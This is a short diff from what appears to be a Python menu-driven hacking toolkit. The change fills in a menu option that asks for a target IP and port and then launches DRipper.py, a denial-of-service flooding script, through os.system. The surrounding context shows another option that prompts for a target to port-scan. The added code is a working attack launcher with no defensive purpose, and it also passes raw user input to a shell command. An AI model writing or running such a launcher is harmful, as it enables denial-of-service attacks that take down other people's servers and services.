@@ -36,7 +36,11 @@ while True:
             os.system("clear")
         break
     elif freakchoice == 2:
-        
+        IPDDOS = input("TARGET IP: ")
+        PORTDDOS = int(input("OPEN PORT: "))
+        print("Press CTRL + C to break")
+        time.sleep(2)
+        os.system(f"python3 DRipper.py -s {IPDDOS} -p {PORTDDOS} -t 443")
     elif freakchoice == 1:
         IP = input("TARGET IP: ")
         METHOD = input("SCAN METHOD (sT, sS, Pn...): ")
